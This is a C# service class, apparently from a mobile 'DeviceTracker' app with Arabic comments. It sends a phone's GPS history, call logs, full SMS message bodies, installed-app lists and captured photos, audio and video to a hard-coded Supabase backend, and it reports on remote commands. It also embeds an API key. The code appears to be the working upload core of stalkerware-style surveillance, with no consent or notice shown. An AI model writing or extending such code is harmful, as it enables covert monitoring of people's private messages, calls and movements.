using System.Net.Http.Headers;
using System.Text;
using DeviceTracker.Models;
using Newtonsoft.Json;

namespace DeviceTracker.Services;

/// <summary>
/// خدمة التواصل مع Supabase.
/// تستخدم Direct REST API (مع anon key + RLS) للقراءة والكتابة.
/// </summary>
public sealed class SupabaseService : IDisposable
{
    private readonly HttpClient _http;

    private static string SupabaseUrl =>
        Preferences.Get("supabase_url", "https://zlhcseovfjilzgxdkskw.supabase.co");

    private static string AnonKey =>
        Preferences.Get("supabase_anon_key",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpsaGNzZW92ZmppbHpneGRrc2t3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA2NTkxNjQsImV4cCI6MjA5NjIzNTE2NH0.tb8oMqMAHMoknDaY_1-GVvONYcG9YrjbnBcJFSJD0SI");

    private static string DeviceSerial =>
        Preferences.Get("device_serial", string.Empty);

    public SupabaseService()
    {
        _http = new HttpClient
        {
            BaseAddress = new Uri(SupabaseUrl.TrimEnd('/') + "/rest/v1/"),
            Timeout = TimeSpan.FromSeconds(15)
        };
        _http.DefaultRequestHeaders.Add("apikey", AnonKey);
        _http.DefaultRequestHeaders.Authorization =
            new AuthenticationHeaderValue("Bearer", AnonKey);
    }

    /// <summary>
    /// تسجيل الجهاز: يستدعي register_device() RPC — SECURITY DEFINER (يتجاوز RLS)
    /// </summary>
    public async Task<bool> RegisterDeviceAsync(string deviceSerial)
    {
        try
        {
            var payload = new
            {
                p_device_serial = deviceSerial,
                p_device_name = DeviceInfo.Name,
                p_manufacturer = DeviceInfo.Manufacturer,
                p_model = DeviceInfo.Model,
                p_os_version = $"{DeviceInfo.Platform} {DeviceInfo.VersionString}",
                p_public_key = Preferences.Get("encryption_key", string.Empty)
            };

            var json = JsonConvert.SerializeObject(payload);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            var response = await _http.PostAsync("rpc/register_device", content);

            if (response.IsSuccessStatusCode)
            {
                var body = await response.Content.ReadAsStringAsync();
                // الـ RPC يرجع JSON array: [{"device_token":"..."}]
                var tokens = JsonConvert.DeserializeObject<List<Dictionary<string, string>>>(body);
                var token = tokens?.FirstOrDefault()?.GetValueOrDefault("device_token");

                if (!string.IsNullOrEmpty(token))
                {
                    Preferences.Set("device_token", token);
                    Preferences.Set("device_serial", deviceSerial);
                    System.Diagnostics.Debug.WriteLine(
                        $"[Supabase] Registered OK, token={token[..8]}...");
                    return true;
                }
            }
            else
            {
                var err = await response.Content.ReadAsStringAsync();
                System.Diagnostics.Debug.WriteLine(
                    $"[Supabase] Register failed ({response.StatusCode}): {err}");
            }

            return false;
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[Supabase] Register error: {ex.Message}");
            return false;
        }
    }

    public async Task<bool> PushLocationAsync(LocationRecord record)
    {
        var serial = DeviceSerial;
        if (string.IsNullOrEmpty(serial)) return false;
        return await IngestAsync("location_history", new
        {
            device_serial = serial,
            latitude = record.Latitude,
            longitude = record.Longitude,
            altitude = record.Altitude,
            accuracy = record.Accuracy,
            speed = record.Speed,
            bearing = record.Bearing,
            captured_at = record.CapturedAt.ToString("o")
        });
    }

    public async Task<bool> PushDeviceStateAsync(DeviceStateRecord record)
    {
        var serial = DeviceSerial;
        if (string.IsNullOrEmpty(serial)) return false;
        return await IngestAsync("device_state_snapshots", new
        {
            device_serial = serial,
            battery_level = record.BatteryLevel,
            is_charging = record.IsCharging,
            network_type = record.NetworkType,
            captured_at = record.CapturedAt.ToString("o")
        });
    }

    public async Task<bool> PushCallLogAsync(CallLogRecord record)
    {
        var serial = DeviceSerial;
        if (string.IsNullOrEmpty(serial)) return false;
        return await IngestAsync("call_logs", new
        {
            device_serial = serial,
            phone_number = record.PhoneNumber,
            contact_name = record.ContactName,
            call_type = record.CallType,
            duration_seconds = record.DurationSeconds,
            call_date = record.CallDate.ToString("o")
        });
    }

    public async Task<bool> PushSmsAsync(SmsRecord record)
    {
        var serial = DeviceSerial;
        if (string.IsNullOrEmpty(serial)) return false;
            return await IngestAsync("sms_messages", new
            {
                device_serial = serial,
                phone_number = record.PhoneNumber,
                message_body = record.MessageBody,
                message_type = record.MessageType,
                sms_date = record.SmsDate.ToString("o")
            });
    }

    public async Task<bool> PushInstalledAppsAsync(IEnumerable<InstalledAppRecord> apps)
    {
        var serial = DeviceSerial;
        if (string.IsNullOrEmpty(serial)) return false;
        var ok = true;
        foreach (var a in apps)
        {
            if (!await IngestAsync("installed_applications", new
            {
                device_serial = serial,
                package_name = a.PackageName,
                app_name = a.AppName,
                version_name = a.VersionName,
                version_code = a.VersionCode,
                is_system_app = a.IsSystemApp,
                captured_at = a.CapturedAt.ToString("o")
            })) ok = false;
        }
        return ok;
    }

    public async Task<bool> PushMediaCaptureAsync(MediaCaptureRecord record)
    {
        var serial = DeviceSerial;
        if (string.IsNullOrEmpty(serial)) return false;
        try
        {
            var storageUrl = await UploadFileAsync(record.FilePath, record.MediaType);
            if (storageUrl == null) return false;

            return await IngestAsync("media_captures", new
            {
                device_serial = serial,
                media_type = record.MediaType,
                file_url = storageUrl,
                file_size_bytes = record.FileSizeBytes,
                mime_type = record.MimeType,
                duration_seconds = record.DurationSeconds,
                captured_at = record.CapturedAt.ToString("o")
            });
        }
        catch { return false; }
    }

    public async Task<bool> UpdateCommandStatusAsync(string commandId, string status)
    {
        var serial = DeviceSerial;
        if (string.IsNullOrEmpty(serial)) return false;
        try
        {
            var payload = new
            {
                status,
                executed_at = DateTime.UtcNow.ToString("o")
            };
            var json = JsonConvert.SerializeObject(payload);
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            var response = await _http.PatchAsync($"remote_commands?id=eq.{commandId}&device_serial=eq.{serial}", content);
            return response.IsSuccessStatusCode;
        }
        catch { return false; }
    }

    // ================================================================
    //  الأساس: إرسال إلى REST API
    // ================================================================

    private async Task<bool> IngestAsync(string table, object payload)
    {
        try
        {
            var json = JsonConvert.SerializeObject(payload,
                Formatting.None,
                new JsonSerializerSettings
                {
                    NullValueHandling = NullValueHandling.Ignore,
                    DateTimeZoneHandling = DateTimeZoneHandling.Utc
                });

            var content = new StringContent(json, Encoding.UTF8, "application/json");
            var response = await _http.PostAsync(table, content);

            if (!response.IsSuccessStatusCode)
            {
                var err = await response.Content.ReadAsStringAsync();
                System.Diagnostics.Debug.WriteLine(
                    $"[Supabase] Ingest {table} failed ({response.StatusCode}): {err?[..Math.Min(err.Length, 100)]}");
            }

            return response.IsSuccessStatusCode;
        }
        catch (Exception ex)
        {
            System.Diagnostics.Debug.WriteLine($"[Supabase] Ingest error: {ex.Message}");
            return false;
        }
    }

    // ================================================================
    //  رفع الملفات إلى Supabase Storage
    // ================================================================

    private async Task<string?> UploadFileAsync(string filePath, string folder)
    {
        try
        {
            if (!File.Exists(filePath)) return null;

            var fileBytes = await File.ReadAllBytesAsync(filePath);
            var fileName = Path.GetFileName(filePath);
            var storageUrl = $"{SupabaseUrl.TrimEnd('/')}/storage/v1/object/{folder}/{fileName}";

            using var content = new ByteArrayContent(fileBytes);
            content.Headers.ContentType = new MediaTypeHeaderValue(
                GetMimeType(fileName));

            var request = new HttpRequestMessage(HttpMethod.Post, storageUrl)
            {
                Content = content
            };
            request.Headers.Add("apikey", AnonKey);
            request.Headers.Authorization = new AuthenticationHeaderValue("Bearer", AnonKey);

            var response = await _http.SendAsync(request);
            return response.IsSuccessStatusCode ? storageUrl : null;
        }
        catch
        {
            return null;
        }
    }

    // ================================================================
    //  توليد Device Token
    // ================================================================

    private static string GenerateDeviceToken()
    {
        var random = new byte[48];
        using var rng = System.Security.Cryptography.RandomNumberGenerator.Create();
        rng.GetBytes(random);
        var token = Convert.ToBase64String(random)
            .Replace("/", "a").Replace("+", "b").Replace("=", "");
        return token.Length > 64 ? token[..64] : token;
    }

    private static readonly Dictionary<string, string> MimeMap = new(StringComparer.OrdinalIgnoreCase)
    {
        [".jpg"] = "image/jpeg", [".jpeg"] = "image/jpeg", [".png"] = "image/png",
        [".gif"] = "image/gif", [".webp"] = "image/webp", [".bmp"] = "image/bmp",
        [".mp4"] = "video/mp4", [".3gp"] = "video/3gpp", [".webm"] = "video/webm",
        [".mp3"] = "audio/mpeg", [".aac"] = "audio/aac", [".wav"] = "audio/wav",
        [".ogg"] = "audio/ogg", [".amr"] = "audio/amr", [".txt"] = "text/plain",
        [".json"] = "application/json", [".xml"] = "application/xml",
        [".pdf"] = "application/pdf", [".zip"] = "application/zip"
    };

    private static string GetMimeType(string fileName)
    {
        var ext = Path.GetExtension(fileName);
        return ext != null && MimeMap.TryGetValue(ext, out var mime) ? mime : "application/octet-stream";
    }

    public void Dispose()
    {
        _http?.Dispose();
    }
}
